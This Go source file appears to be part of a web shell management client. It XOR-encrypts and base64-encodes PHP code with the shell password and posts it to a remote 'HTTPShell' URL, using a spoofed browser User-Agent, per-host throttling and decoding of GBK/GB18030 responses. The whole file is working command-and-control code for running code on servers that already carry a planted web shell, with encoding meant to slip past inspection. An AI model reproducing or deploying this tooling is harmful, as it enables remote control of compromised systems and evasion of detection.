package session

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
	"unicode/utf8"
)

var xorHosts = struct {
	sync.Mutex
	next map[string]time.Time
}{next: map[string]time.Time{}}

func customXORBody(key, code string) ([]byte, error) {
	if len(key) != 16 {
		return nil, fmt.Errorf("phpxor requires a 16-byte key")
	}
	for _, tag := range []string{"<?php", "<?", "?>"} {
		code = strings.ReplaceAll(code, tag, "")
	}
	raw := []byte("junk|" + code)
	for i := range raw {
		raw[i] ^= key[(i+1)&15]
	}
	out := make([]byte, base64.StdEncoding.EncodedLen(len(raw)))
	base64.StdEncoding.Encode(out, raw)
	return out, nil
}
func waitXORHost(ctx context.Context, host string) error {
	now := time.Now()
	xorHosts.Lock()
	if len(xorHosts.next) > 1024 {
		for h, t := range xorHosts.next {
			if now.Sub(t) > time.Minute {
				delete(xorHosts.next, h)
			}
		}
		if len(xorHosts.next) > 1024 {
			xorHosts.Unlock()
			return fmt.Errorf("too many active XOR hosts")
		}
	}
	at := xorHosts.next[host]
	if at.Before(now) {
		at = now
	}
	xorHosts.next[host] = at.Add(500 * time.Millisecond)
	xorHosts.Unlock()
	timer := time.NewTimer(time.Until(at))
	defer timer.Stop()
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-timer.C:
		return nil
	}
}
func (s *HTTPShell) postCustomXOR(ctx context.Context, fields url.Values, timeout time.Duration) (string, http.Header, error) {
	if timeout <= 0 {
		timeout = defaultHTTPTimeout
	}
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	u, err := url.Parse(s.url)
	if err != nil {
		return "", nil, err
	}
	if err = waitXORHost(ctx, strings.ToLower(u.Hostname())); err != nil {
		return "", nil, err
	}
	body, err := customXORBody(s.password, fields.Get(s.password))
	if err != nil {
		return "", nil, err
	}
	req, err := http.NewRequestWithContext(ctx, "POST", s.url, bytes.NewReader(body))
	if err != nil {
		return "", nil, err
	}
	req.Close = true
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("User-Agent", "Mozilla/5.0 (ARTEX)")
	res, err := s.client.Do(req)
	if err != nil {
		return "", nil, err
	}
	defer res.Body.Close()
	b, err := io.ReadAll(io.LimitReader(res.Body, maxBodyRead+1))
	if err != nil {
		return "", nil, err
	}
	if len(b) > maxBodyRead {
		return "", nil, fmt.Errorf("response too large")
	}
	var out string
	if s.httpOptions.Encoding == "gbk" || s.httpOptions.Encoding == "gb18030" {
		out, err = decodeShellBody(b, s.httpOptions.Encoding)
	} else if utf8.Valid(b) {
		out = string(b)
	} else {
		r := make([]rune, len(b))
		for i, v := range b {
			r[i] = rune(v)
		}
		out = string(r)
	}
	if err != nil {
		return "", nil, err
	}
	if res.StatusCode >= 400 {
		return "", res.Header, fmt.Errorf("XOR endpoint HTTP %d", res.StatusCode)
	}
	return out, res.Header, nil
}
